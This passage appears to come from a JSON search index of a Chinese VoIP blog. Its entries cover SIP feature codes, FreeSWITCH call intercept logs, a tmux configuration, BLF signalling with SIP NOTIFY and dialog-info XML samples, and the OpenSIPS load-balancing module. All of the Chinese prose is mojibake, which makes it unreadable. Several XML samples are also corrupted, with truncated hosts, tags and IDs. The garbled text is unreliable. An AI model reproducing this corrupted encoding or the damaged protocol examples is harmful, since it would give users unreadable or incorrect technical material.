ï¼Œå¯¹åº”çš„ä¸šåŠ¡é€»è¾‘æ˜¯å¯é…ç½®çš„ã€‚\nåœºæ™¯ä¸¾ä¾‹ æˆ‘çš„åˆ†æœºæ˜¯8001ï¼Œæˆ‘çœ‹åˆ°8008çš„åˆ†æœºæ­£åœ¨æŒ¯é“ƒï¼Œæ­¤æ—¶æˆ‘éœ€è¦æŠŠç”µè¯æ¥èµ·æ¥ã€‚ä½†æ˜¯æˆ‘ä¸èƒ½èµ°åˆ°8008çš„å·¥ä½ä¸Šå»æ¥ç”µè¯ï¼Œæˆ‘å¿…é¡»è¦åœ¨è‡ªå·±çš„å·¥ä½ä¸Šæ¥ç”µè¯ã€‚\né‚£ä¹ˆæˆ‘åœ¨è‡ªå·±çš„åˆ†æœºä¸Šè¾“å…¥*18008Â è¿™æ—¶SIPæœåŠ¡ç«¯å°±çŸ¥é“ä½ æƒ³ä»£8008æ¥å¬æ­£åœ¨æŒ¯é“ƒçš„ç”µè¯ã€‚\nè¯´èµ·æ¥åŠŸèƒ½ç å°±æ˜¯ä¸€ç§ä½¿ç”¨è¯æœºä¸ŠæŒ‰é”®çš„ä¸€ç»„æš—å·ã€‚\nè¯æœºä¸Šä¸€èˆ¬åªæœ‰0-9*#ï¼Œä¸€å…±12ä¸ªæŒ‰é”®ã€‚æ²¡æ³•åŠç”¨å…¶ä»–çš„ç¼–ç å‘Šè¯‰æœåŠ¡ç«¯è‡ªå·±æƒ³åšä»€ä¹ˆï¼Œæ‰€ä»¥åªèƒ½ç”¨åŠŸèƒ½ç ã€‚\nå‚è€ƒ https://www.ipcomms.net/support/myoffice-pbx/feature-codes https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/cucme/admin/configuration/manual/cmeadm/cmefacs.pdf https://help.yeastar.com/en/s-series/topic/feature_code.html?hl=feature%2Ccode\u0026amp;_ga=2.76562834.622619423.1615949948-1155631884.1615949948 ","title":"SIP feature codes SIPåŠŸèƒ½ç "},{"content":"FSçš„ call pickupåŠŸèƒ½ï¼Œå°±æ˜¯ç”¨interceptåŠŸèƒ½ã€‚\nä¸€ä¸ªå‘¼å«ä¸€èˆ¬æœ‰ä¸¤ä¸ªleg, interceptä¸€èˆ¬æ˜¯æŠŠè‡ªå·±bridgeå…¶ä¸­ä¸€ä¸ªlegï¼Œå¦å¤–ä¸€ä¸ªlegä¼šæŒ‚æ–­ã€‚ intercepté»˜è®¤æ˜¯bridge legA, æŒ‚æ–­legBã€‚é€šè¿‡å‚æ•°ä¹Ÿå¯ä»¥æŒ‡å®šæ¥bridge legBï¼ŒæŒ‚æ–­legAã€‚\nä»ä¸€ä¸ªç®€å•çš„åœºæ™¯è¯´èµ·ã€‚Aæ‹¨æ‰“Båˆ†æœºã€‚\nä»FSçš„è§’åº¦æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹ä¸¤æ¡è…¿ã€‚\né€šè¿‡åˆ†ææ—¥å¿—å¯ä»¥å‘ç°ï¼šå…·æœ‰replacesè¿™ç§å¤´çš„inviteï¼Œfsæ²¡æœ‰èµ°è·¯ç”±ï¼Œè€Œæ˜¯ç›´æ¥ç”¨äº†interceptæ‹¦æˆªã€‚\nNew Channel sofia/external/8003@wdd.cc [6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1]2021-03-15 10:42:47.380797 [NOTICE] switch_channel.c:1118 New Channel sofia/external/8001@wdd.cc [34dc4095-3bac-4f7d-8be4-1ed5ed2f06b4]\n2021-03-15 10:42:51.520800 [NOTICE] switch_channel.c:1118 New Channel sofia/external/8004@wdd.cc [03e78837-1413-4b77-ba4c-e753fed55ebe]2021-03-15 10:42:51.520800 [DEBUG] switch_core_state_machine.c:585 (sofia/external/8004@wdd.cc) Running State Change CS_NEW (Cur 3 Tot 163)2021-03-15 10:42:51.520800 [DEBUG] sofia.c:10279 sofia/external/8004@wdd.cc receiving invite from 192.168.2.109:18627 version: 1.10.3-release 32bit2021-03-15 10:42:51.520800 [DEBUG] sofia.c:11640 call 6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1 intercepted2021-03-15 10:42:51.520800 [DEBUG] sofia.c:7325 Channel sofia/external/8004@wdd.cc entering state [received][100]\nEXECUTE [depth=0] sofia/external/8004@wdd.cc intercept(6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1)\nå¸¸è§çš„ä½¿ç”¨åœºæ™¯ï¼š\næŸä¸ªç”µè¯æ­£åœ¨æŒ¯é“ƒï¼Œä½†æ˜¯æ²¡äººæ¥ã€‚å¦‚æœæˆ‘çš„è¯æœºé€šè¿‡BLFç›‘æ§äº†è¿™ä¸ªåˆ†æœºï¼Œå°±å¯ä»¥é€šè¿‡æŒ‰é”®æ¥ç”¨æˆ‘è‡ªå·±çš„è¯æœºä»£æ¥æ­£åœ¨æŒ¯é“ƒçš„è¯æœºã€‚ å‚è€ƒ https://www.yuque.com/wangdd/fyikfz/lawr6v https://www.yuque.com/wangdd/fyikfz/lawr6v ","permalink":"https://wdd.js.org/freeswitch/intercept/","summary":"FSçš„ call pickupåŠŸèƒ½ï¼Œå°±æ˜¯ç”¨interceptåŠŸèƒ½ã€‚\nä¸€ä¸ªå‘¼å«ä¸€èˆ¬æœ‰ä¸¤ä¸ªleg, interceptä¸€èˆ¬æ˜¯æŠŠè‡ªå·±bridgeå…¶ä¸­ä¸€ä¸ªlegï¼Œå¦å¤–ä¸€ä¸ªlegä¼šæŒ‚æ–­ã€‚ intercepté»˜è®¤æ˜¯bridge legA, æŒ‚æ–­legBã€‚é€šè¿‡å‚æ•°ä¹Ÿå¯ä»¥æŒ‡å®šæ¥bridge legBï¼ŒæŒ‚æ–­legAã€‚\nä»ä¸€ä¸ªç®€å•çš„åœºæ™¯è¯´èµ·ã€‚Aæ‹¨æ‰“Båˆ†æœºã€‚\nä»FSçš„è§’åº¦æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹ä¸¤æ¡è…¿ã€‚\né€šè¿‡åˆ†ææ—¥å¿—å¯ä»¥å‘ç°ï¼šå…·æœ‰replacesè¿™ç§å¤´çš„inviteï¼Œfsæ²¡æœ‰èµ°è·¯ç”±ï¼Œè€Œæ˜¯ç›´æ¥ç”¨äº†interceptæ‹¦æˆªã€‚\nNew Channel sofia/external/8003@wdd.cc [6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1]2021-03-15 10:42:47.380797 [NOTICE] switch_channel.c:1118 New Channel sofia/external/8001@wdd.cc [34dc4095-3bac-4f7d-8be4-1ed5ed2f06b4]\n2021-03-15 10:42:51.520800 [NOTICE] switch_channel.c:1118 New Channel sofia/external/8004@wdd.cc [03e78837-1413-4b77-ba4c-e753fed55ebe]2021-03-15 10:42:51.520800 [DEBUG] switch_core_state_machine.c:585 (sofia/external/8004@wdd.cc) Running State Change CS_NEW (Cur 3 Tot 163)2021-03-15 10:42:51.520800 [DEBUG] sofia.c:10279 sofia/external/8004@wdd.cc receiving invite from 192.168.2.109:18627 version: 1.10.3-release 32bit2021-03-15 10:42:51.520800 [DEBUG] sofia.c:11640 call 6ca5ed94-a5e5-492d-aaf7-782cecbaf7d1 intercepted2021-03-15 10:42:51.520800 [DEBUG] sofia.c:7325 Channel sofia/external/8004@wdd.cc entering state [received][100]\nEXECUTE [depth=0] sofia/external/8004@wdd.","title":"FS interceptæ‹¦æˆª"},{"content":"rfc http://www.rfcreader.com/\nrfcreaderæ˜¯ä¸€ä¸ªåœ¨çº¿çš„ç½‘ç«™ï¼Œå¯ä»¥é˜…è¯»å’Œæœç´¢rfcæ–‡æ¡£ã€‚\nå¦å¤–ä¹Ÿå…·æœ‰ä¸€äº›éå¸¸å¥½ç”¨çš„åŠŸèƒ½\næ”¯æŒè´¦å·ç™»å½•ï¼Œæ”¶è—è‡ªå·±å–œæ¬¢çš„rfcæ–‡æ¡£ å¯ä»¥å¯¹rfcè¿›è¡Œæ ‡è®°ï¼Œè¯„è®ºã€‚ æœ‰è‰¯å¥½çš„ç›®å½• æ”¯æŒä¹¦ç­¾ ç­‰ç­‰ã€‚ã€‚ã€‚ã€‚ ","permalink":"https://wdd.js.org/posts/2021/03/mcbqod/","summary":"rfc http://www.rfcreader.com/\nrfcreaderæ˜¯ä¸€ä¸ªåœ¨çº¿çš„ç½‘ç«™ï¼Œå¯ä»¥é˜…è¯»å’Œæœç´¢rfcæ–‡æ¡£ã€‚\nå¦å¤–ä¹Ÿå…·æœ‰ä¸€äº›éå¸¸å¥½ç”¨çš„åŠŸèƒ½\næ”¯æŒè´¦å·ç™»å½•ï¼Œæ”¶è—è‡ªå·±å–œæ¬¢çš„rfcæ–‡æ¡£ å¯ä»¥å¯¹rfcè¿›è¡Œæ ‡è®°ï¼Œè¯„è®ºã€‚ æœ‰è‰¯å¥½çš„ç›®å½• æ”¯æŒä¹¦ç­¾ ç­‰ç­‰ã€‚ã€‚ã€‚ã€‚ ","title":"RFCé˜…è¯»ç¥å™¨ rfcreader"},{"content":"å‚è€ƒï¼š https://github.com/gpakosz/.tmux\nä¼˜ç‚¹ï¼š\nç•Œé¢éå¸¸æ¼‚äº®ï¼Œæœ‰å¾ˆå¤šæŒ‡ç¤ºå›¾æ ‡ï¼Œèƒ½å¤Ÿå®æ—¶çš„æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€ï¼Œsessionå’Œwindowä¿¡æ¯ å¿«æ·é”®éå¸¸åˆç†ï¼Œéå¸¸å¥½ç”¨ cd git clone https://gitee.com/wangduanduan/tmux.git mv tmux .tmux ln -s -f .tmux/.tmux.conf cp .tmux/.tmux.conf.local . å¾®è°ƒé…ç½® å¯ç”¨ctrl+aå…‰æ ‡å®šä½åˆ°è¡Œé¦– é»˜è®¤æƒ…å†µä¸‹ï¼Œctrl+aè¢«é…ç½®æˆå’Œctrl+bçš„åŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯å¤§å¤šæ•°åœºæ™¯ä¸‹ï¼Œctrl+aæ˜¯readlineçš„å…‰æ ‡å›åˆ°è¡Œé¦–çš„å¿«æ·é”®ï¼Œ\næ‰€ä»¥æˆ‘ä»¬éœ€è¦æ¢å¤ctrl+açš„åŸæœ‰åŠŸèƒ½ã€‚\nåªéœ€è¦æŠŠä¸‹é¢çš„ä¸¤è¡Œå–æ¶ˆæ³¨é‡Š\nset -gu prefix2 unbind C-a å¤åˆ¶æ¨¡å¼æ”¯æŒjkä¸Šä¸‹ç§»åŠ¨ set -g mode-keys vi åœ¨ç›¸åŒçš„ç›®å½•æ‰“å¼€æ–°çš„çª—å£æˆ–è€…æ ‡ç­¾é¡µ tmux_conf_new_window_retain_current_path=true tmux_conf_new_pane_retain_current_path=true éšè—ç³»ç»Ÿè¿è¡Œæ—¶é—´ä¿¡æ¯ çŠ¶æ€æ çš„ç³»ç»Ÿè¿è¡Œæ—¶é•¿ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ï¼Œå¯ä»¥éšè—\ntmux_conf_theme_status_left=\u0026#34; â #S \u0026#34; ","permalink":"https://wdd.js.org/posts/2021/03/yroxga/","summary":"å‚è€ƒï¼š https://github.com/gpakosz/.tmux\nä¼˜ç‚¹ï¼š\nç•Œé¢éå¸¸æ¼‚äº®ï¼Œæœ‰å¾ˆå¤šæŒ‡ç¤ºå›¾æ ‡ï¼Œèƒ½å¤Ÿå®æ—¶çš„æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€ï¼Œsessionå’Œwindowä¿¡æ¯ å¿«æ·é”®éå¸¸åˆç†ï¼Œéå¸¸å¥½ç”¨ cd git clone https://gitee.com/wangduanduan/tmux.git mv tmux .tmux ln -s -f .tmux/.tmux.conf cp .tmux/.tmux.conf.local . å¾®è°ƒé…ç½® å¯ç”¨ctrl+aå…‰æ ‡å®šä½åˆ°è¡Œé¦– é»˜è®¤æƒ…å†µä¸‹ï¼Œctrl+aè¢«é…ç½®æˆå’Œctrl+bçš„åŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯å¤§å¤šæ•°åœºæ™¯ä¸‹ï¼Œctrl+aæ˜¯readlineçš„å…‰æ ‡å›åˆ°è¡Œé¦–çš„å¿«æ·é”®ï¼Œ\næ‰€ä»¥æˆ‘ä»¬éœ€è¦æ¢å¤ctrl+açš„åŸæœ‰åŠŸèƒ½ã€‚\nåªéœ€è¦æŠŠä¸‹é¢çš„ä¸¤è¡Œå–æ¶ˆæ³¨é‡Š\nset -gu prefix2 unbind C-a å¤åˆ¶æ¨¡å¼æ”¯æŒjkä¸Šä¸‹ç§»åŠ¨ set -g mode-keys vi åœ¨ç›¸åŒçš„ç›®å½•æ‰“å¼€æ–°çš„çª—å£æˆ–è€…æ ‡ç­¾é¡µ tmux_conf_new_window_retain_current_path=true tmux_conf_new_pane_retain_current_path=true éšè—ç³»ç»Ÿè¿è¡Œæ—¶é—´ä¿¡æ¯ çŠ¶æ€æ çš„ç³»ç»Ÿè¿è¡Œæ—¶é•¿ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨ï¼Œå¯ä»¥éšè—\ntmux_conf_theme_status_left=\u0026#34; â #S \u0026#34; ","title":"oh my tmux tmuxçš„é«˜çº§å®šåˆ¶"},{"content":"BLFåŠŸèƒ½ç®€ä»‹ BLFæ˜¯busy lamp fieldçš„ç¼©å†™ã€‚ä¸€å¥è¯ä»‹ç»å°±æ˜¯ï¼Œä¸€ä¸ªåˆ†æœºå¯ä»¥ç›‘æ§å¦ä¸€ä¸ªåˆ†æœºçš„å‘¼å«çŠ¶æ€ï¼ŒçŠ¶æ€å¯ä»¥é€šè¿‡åˆ†æœºä¸Šçš„æŒ‡ç¤ºç¯æ¥è¡¨ç¤ºã€‚\nä¾‹å¦‚ï¼šåˆ†æœºAé€šè¿‡é…ç½®è¿‡åï¼Œç›‘æ§äº†åˆ†æœºBã€‚\nå¦‚æœåˆ†æœºBæ²¡æœ‰é€šè¯ï¼Œé‚£ä¹ˆåˆ†æœºAä¸Šçš„æŒ‡ç¤ºç¯æ˜¾ç¤ºç»¿è‰² å¦‚æœåˆ†æœºBä¸Šæœ‰ä¸€ä¸ªå‘¼å«æ­£åœ¨æŒ¯é“ƒï¼Œé‚£ä¹ˆåˆ†æœºAæŒ‡ç¤ºç¯çº¢è‰²ç¯é—ªçƒ å¦‚æœåˆ†æœºBæ­£åœ¨æ‰“ç”µè¯ï¼Œé‚£ä¹ˆåˆ†æœºAçš„æŒ‡ç¤ºç¯æ˜¾ç¤ºçº¢è‰² è¿™ä¸ªåŠŸèƒ½çš„ä½¿ç”¨åœºæ™¯å¾€å¾€æ—¶ä¾‹å¦‚ç§˜ä¹¦Bç›‘æ§äº†è€æ¿Açš„è¯æœºï¼Œåœ¨ç§˜ä¹¦æŠŠç”µè¯è½¬ç»™è€æ¿ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡è‡ªå·±ç”µè¯ä¸Šçš„æŒ‡ç¤ºç¯ï¼Œæ¥åˆ¤æ–­è€æ¿æœ‰æ²¡æœ‰åœ¨æ‰“ç”µè¯ï¼Œå¦‚æœæ²¡æœ‰å†æ‰“ç”µè¯ï¼Œæ‰å¯ä»¥æŠŠç”µè¯è½¬è¿‡å»ã€‚\nä¿¡ä»¤å®ç°é€»è¾‘ ä¿¡ä»¤åˆ†æ ç©ºé—²é€šçŸ¥ NOTIFY sip:8003@192.168.2.109:5060 SIP/2.0 Via: SIP/2.0/UDP 192.168.2.109:18627;branch=z9hG4bKfef7.27d86e6.0 To: \u0026lt;sip:8003@wdd.cc\u0026gt;;tag=1 From: \u0026lt;sip:9999@wdd.cc\u0026gt;;tag=d009-12c2f272e7622c1cd9b6aa285a7b9736 CSeq: 1 NOTIFY Call-ID: 1-774753@127.0.1.1 Route: \u0026lt;sip:192.168.2.109:19666;ftag=1;lr\u0026gt; Max-Forwards: 70 Content-Length: 140 User-Agent:WMS Event: dialog Contact: \u0026lt;sip:core@192.168.2.109:18627\u0026gt; Subscription-State: active;expires=120 Content-Type: application/dialog-info+xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;0\u0026#34; state=\u0026#34;full\u0026#34; entity=\u0026#34;sip:9999@wdd.cc\u0026#34;/\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;0\u0026#34; state=\u0026#34;full\u0026#34; entity=\u0026#34;sip:9999@wdd.cc\u0026#34;\u0026gt;\u0026lt;/dialog-info\u0026gt; é€šè¯é€šçŸ¥ NOTIFY sip:8003@192.168.2.109:5060 SIP/2.0 Via: SIP/2.0/UDP 192.168.2.109:18627;branch=z9hG4bKcef7.91c1e716.0 To: \u0026lt;sip:8003@wdd.cc\u0026gt;;tag=1 From: \u0026lt;sip:9999@wdd.cc\u0026gt;;tag=d009-12c2f272e7622c1cd9b6aa285a7b9736 CSeq: 2 NOTIFY Call-ID: 1-774753@127.0.1.1 Route: \u0026lt;sip:192.168.2.109:19666;ftag=1;lr\u0026gt; Max-Forwards: 70 Content-Length: 466 User-Agent:WMS Event: dialog Contact: \u0026lt;sip:core@192.168.2.109:18627\u0026gt; Subscription-State: active;expires=108 Content-Type: application/dialog-info+xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;1\u0026#34; entity=\u0026#34;sip:9999@wdd.cc\u0026#34; state=\u0026#34;partial\u0026#34;\u0026gt;\u0026lt;dialog id=\u0026#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgx 9N\u0026#34; call-id=\u0026#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgxtp9N\u0026#34; direction=\u0026#34;recipient\u0026#34;\u0026gt;\u0026lt;state\u0026gt;confirmed\u0026lt;/state\u0026gt;\u0026lt;remote\u0026gt;\u0026lt;identity\u0026gt;sip:8001@wdd.cc\u0026lt;/identity\u0026gt;\u0026lt;target uri=\u0026#34;sip:8001@ d.cc\u0026#34;/\u0026gt;\u0026lt;/remote\u0026gt;\u0026lt;local\u0026gt;\u0026lt;identity\u0026gt;sip:9999@wdd.cc\u0026lt;/identity\u0026gt;\u0026lt;target uri=\u0026#34;sip:9999@wdd.cc\u0026#34;/\u0026gt;\u0026lt;/local\u0026gt;\u0026lt;/dialog\u0026gt;\u0026lt;/dialog-info\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;1\u0026#34; entity=\u0026#34;sip:9999@wdd.cc\u0026#34; state=\u0026#34;partial\u0026#34;\u0026gt; \u0026lt;dialog id=\u0026#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgx 9N\u0026#34; call-id=\u0026#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgxtp9N\u0026#34; direction=\u0026#34;recipient\u0026#34;\u0026gt; \u0026lt;state\u0026gt;confirmed\u0026lt;/state\u0026gt; \u0026lt;remote\u0026gt; \u0026lt;identity\u0026gt;sip:8001@wdd.cc\u0026lt;/identity\u0026gt; \u0026lt;target uri=\u0026#34;sip:8001@wdd.cc\u0026#34;/\u0026gt; \u0026lt;/remote\u0026gt; \u0026lt;local\u0026gt; \u0026lt;identity\u0026gt;sip:9999@wdd.cc\u0026lt;/identity\u0026gt; \u0026lt;target uri=\u0026#34;sip:9999@wdd.cc\u0026#34;/\u0026gt; \u0026lt;/local\u0026gt; \u0026lt;/dialog\u0026gt; \u0026lt;/dialog-info\u0026gt; è¯·æ±‚ä½“çš„æ ¼å¼è¯´æ˜å‚è§ï¼šhttps://tools.ietf.org/html/rfc4235#section-4\næŒ‚æ–­Body \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;1\u0026#34; entity=\u0026#34;sip:8001@wdd.cc\u0026#34; state=\u0026#34;partial\u0026#34;\u0026gt;\u0026lt;dialog id=\u0026#34;45f1115c-fc32-1239-7198-b827 6c4366\u0026#34; call-id=\u0026#34;45f1115c-fc32-1239-7198-b827eb6c4366\u0026#34; direction=\u0026#34;recipient\u0026#34;\u0026gt;\u0026lt;state\u0026gt;terminated\u0026lt;/state\u0026gt;\u0026lt;remote\u0026gt;\u0026lt;identity\u0026gt;sip:0000000000@192.168.2.53\u0026lt;/identity\u0026gt;\u0026lt; rget uri=\u0026#34;sip:0000000000@192.168.2.53\u0026#34;/\u0026gt;\u0026lt;/remote\u0026gt;\u0026lt;local\u0026gt;\u0026lt;identity\u0026gt;sip:8001@wdd.cc\u0026lt;/identity\u0026gt;\u0026lt;target uri=\u0026#34;sip:8001@wdd.cc\u0026#34;/\u0026gt;\u0026lt;/local\u0026gt;\u0026lt;/dialog\u0026gt;\u0026lt;/dialog-info\u0026gt; å‚è€ƒ https://www.opensips.org/Documentation/Tutorials-Presence-PuaDialoinfoConfig https://www.yuque.com/wangdd/fyikfz/qs2vqx https://tools.ietf.org/html/rfc4235 ","permalink":"https://wdd.js.org/opensips/ch9/blf-note/","summary":"BLFåŠŸèƒ½ç®€ä»‹ BLFæ˜¯busy lamp fieldçš„ç¼©å†™ã€‚ä¸€å¥è¯ä»‹ç»å°±æ˜¯ï¼Œä¸€ä¸ªåˆ†æœºå¯ä»¥ç›‘æ§å¦ä¸€ä¸ªåˆ†æœºçš„å‘¼å«çŠ¶æ€ï¼ŒçŠ¶æ€å¯ä»¥é€šè¿‡åˆ†æœºä¸Šçš„æŒ‡ç¤ºç¯æ¥è¡¨ç¤ºã€‚\nä¾‹å¦‚ï¼šåˆ†æœºAé€šè¿‡é…ç½®è¿‡åï¼Œç›‘æ§äº†åˆ†æœºBã€‚\nå¦‚æœåˆ†æœºBæ²¡æœ‰é€šè¯ï¼Œé‚£ä¹ˆåˆ†æœºAä¸Šçš„æŒ‡ç¤ºç¯æ˜¾ç¤ºç»¿è‰² å¦‚æœåˆ†æœºBä¸Šæœ‰ä¸€ä¸ªå‘¼å«æ­£åœ¨æŒ¯é“ƒï¼Œé‚£ä¹ˆåˆ†æœºAæŒ‡ç¤ºç¯çº¢è‰²ç¯é—ªçƒ å¦‚æœåˆ†æœºBæ­£åœ¨æ‰“ç”µè¯ï¼Œé‚£ä¹ˆåˆ†æœºAçš„æŒ‡ç¤ºç¯æ˜¾ç¤ºçº¢è‰² è¿™ä¸ªåŠŸèƒ½çš„ä½¿ç”¨åœºæ™¯å¾€å¾€æ—¶ä¾‹å¦‚ç§˜ä¹¦Bç›‘æ§äº†è€æ¿Açš„è¯æœºï¼Œåœ¨ç§˜ä¹¦æŠŠç”µè¯è½¬ç»™è€æ¿ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡è‡ªå·±ç”µè¯ä¸Šçš„æŒ‡ç¤ºç¯ï¼Œæ¥åˆ¤æ–­è€æ¿æœ‰æ²¡æœ‰åœ¨æ‰“ç”µè¯ï¼Œå¦‚æœæ²¡æœ‰å†æ‰“ç”µè¯ï¼Œæ‰å¯ä»¥æŠŠç”µè¯è½¬è¿‡å»ã€‚\nä¿¡ä»¤å®ç°é€»è¾‘ ä¿¡ä»¤åˆ†æ ç©ºé—²é€šçŸ¥ NOTIFY sip:8003@192.168.2.109:5060 SIP/2.0 Via: SIP/2.0/UDP 192.168.2.109:18627;branch=z9hG4bKfef7.27d86e6.0 To: \u0026lt;sip:8003@wdd.cc\u0026gt;;tag=1 From: \u0026lt;sip:9999@wdd.cc\u0026gt;;tag=d009-12c2f272e7622c1cd9b6aa285a7b9736 CSeq: 1 NOTIFY Call-ID: 1-774753@127.0.1.1 Route: \u0026lt;sip:192.168.2.109:19666;ftag=1;lr\u0026gt; Max-Forwards: 70 Content-Length: 140 User-Agent:WMS Event: dialog Contact: \u0026lt;sip:core@192.168.2.109:18627\u0026gt; Subscription-State: active;expires=120 Content-Type: application/dialog-info+xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;0\u0026#34; state=\u0026#34;full\u0026#34; entity=\u0026#34;sip:9999@wdd.cc\u0026#34;/\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;dialog-info xmlns=\u0026#34;urn:ietf:params:xml:ns:dialog-info\u0026#34; version=\u0026#34;0\u0026#34; state=\u0026#34;full\u0026#34; entity=\u0026#34;sip:9999@wdd.cc\u0026#34;\u0026gt;\u0026lt;/dialog-info\u0026gt; é€šè¯é€šçŸ¥ NOTIFY sip:8003@192.168.2.109:5060 SIP/2.0 Via: SIP/2.0/UDP 192.168.2.109:18627;branch=z9hG4bKcef7.91c1e716.0 To: \u0026lt;sip:8003@wdd.cc\u0026gt;;tag=1 From: \u0026lt;sip:9999@wdd.cc\u0026gt;;tag=d009-12c2f272e7622c1cd9b6aa285a7b9736 CSeq: 2 NOTIFY Call-ID: 1-774753@127.","title":"BLFåŠŸèƒ½ç¬”è®°"},{"content":"https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9\n1.Â Load Balancing in OpenSIPS The \u0026ldquo;load-balancing\u0026rdquo; module comes to provide traffic routing based on load. Shortly, when OpenSIPS routes calls to a set of destinations, it is able to keep the load status (as number of ongoing calls) of each destination and to choose to route to the less loaded destination (at that moment). OpenSIPS is aware of the capacity of each destination - it is pre-configured with the maximum load accepted by the destinations. To be more precise, when routing, OpenSIPS will consider the less loaded destination not the destination with the smallest number of ongoing calls, but the destination with the largest available slot.\nAlso, the \u0026ldquo;load-balancing\u0026rdquo; (LB) module is able to receive feedback from the destinations (if they are capable of). This mechanism is used for notifying OpenSIPS when the maximum capacity of a destination changed (like a GW with more or less E1 cards).\nThe \u0026ldquo;load-balancing\u0026rdquo; functionality comes to enhance the \u0026ldquo;dispatcher\u0026rdquo; one. The difference comes in having or not load information about the destinations where you are routing to:\nDispatcher has no load information - it just blindly forwards calls to the destinations based on a probabilistic dispersion logic. It gets no feedback about the load of the destination (like how many calls that were sent actually were established or how many are still going). Load-balancer is load driven - LB routing logic is based primary on the load information. The LB module is using the DIALOG module in order to keep trace of the load (ongoing calls). 2.Â Load Balancing - how it works When looking at the LB implementation in OpenSIPS, we have 3 aspects:\n2.1Â Destination set A destination is defined by its address (a SIP URI) and its description as capacity.\nForm the LB module perspective, the destinations are not homogeneous - they are not alike; and not only from capacity point of view, but also from what kind of services/resources they offer. For example, you may have a set of Yate/Asterisk boxes for media-related services -some of them are doing transcoding, other voicemail or conference, other simple announcement , other PSTN termination. But you may have mixed boxes - one box may do PSTN and voicemail in the same time. So each destination from the set may offer a different set of services/resources.\nSo, for each destination, the LB module defines the offered resources, and for each resource, it defines the capacity / maximum load as number of concurrent calls the destination can handle for that resource.\nExample: 4 destinations/boxes in the LB set\noffers 30 channels for transcoding and 32 for PSTN offers 100 voicemail channels and 10 for transcoding offers 50 voicemail channels and 300 for conference offers 10 voicemail, 10 conference, 10 transcoding and 32 PSTN id group_id dst_uri resources 1 1 sip:yate1.mycluster.net transc=30; pstn=32 2 1 sip:yate2.mycluster.net vm=100; transc=10 3 1 sip:yate3.mycluster.net vm=50; conf=300 4 1 sip:yate4.mycluster.net vm=10;conf=10;transc=10;pstn=32 For runtime, the LB module provides MI commands for:\nreloading the definition of destination sets changing the capacity for a resource for a destination 2.2Â Invoking Load-balancing Using the LB functionality is very simple - you just have to pass to the LB module what kind of resources the call requires.\nThe resource detection is done in the OpenSIPS routing script, based on whatever information is appropriated. For example, looking at the RURI (dialed number) you can see if the call must go to PSTN or if it a voicemail or conference number; also, by looking at the codecs advertised in the SDP, you can figure out if transcoding is or not also required.\nif (!load_balance(\u0026#34;1\u0026#34;,\u0026#34;transc;pstn\u0026#34;)) { sl_send_reply(\u0026#34;500\u0026#34;,\u0026#34;Service full\u0026#34;); exit; } The first parameter of the function identifies the LB set to be used (see the group_id column in the above DB snapshot). Second parameter is list of the required resource for the call. A third optional parameter my be passed to instruct the LB engine on how to estimate the load - in absolute value (how many channels are used) or in relative value (how many percentages are used).\nThe load_balance() will automatically create the dialog state for the call (in order to monitor it) and will also allocate the requested resources for it (from the selected box).\nThe function will set as destination URI ($du) the address of the selected destination/box.\nThe resources will be automatically released when the call terminates.The LB module provides an MI function that allows the admin to inspect the current load over the destinations.\n2.3Â The LB logic The logic used by the LB module to select the destination is:\ngets the destination set based on the group_id (first parameter of the load_balance() function) selects from the set only the destinations that are able to provide the requested resources (second parameter of the load_balance() function) for the selected destinations, it evaluated the current load for each requested resource the winning destination is the one with the biggest value for the minimum available load per resources. Example:\n4 destinations/boxes in the LB set\noffers 30 channels for transcoding and 32 for PSTN offers 100 voicemail channels and 10 for transcoding offers 50 voicemail channels and 300 for conference offers 10 voicemail, 10 conference, 10 transcoding and 32 PSTN when calling load_balance(\u0026ldquo;1\u0026rdquo;,\u0026ldquo;transc;pstn\u0026rdquo;) -\u0026gt;\nonly boxes (1) and (4) will be selected at as they offer both transcoding and pstn evaluating the load : (1) transcoding - 10 channels used; PSTN - 18 used (4) transcoding - 9 channels used; PSTN - 16 usedÂ evaluating available load (capacity-load) : - (1) transcoding - 20 channels used; PSTN - 14 usedÂ - (4) transcoding - 1 channels used; PSTN - 16 usedÂ for each box, the minimum available load (through all resources) (1) 14 (PSTN) (2) 1 (transcoding)Â final selected box in (1) as it has the the biggest (=14) available load for the 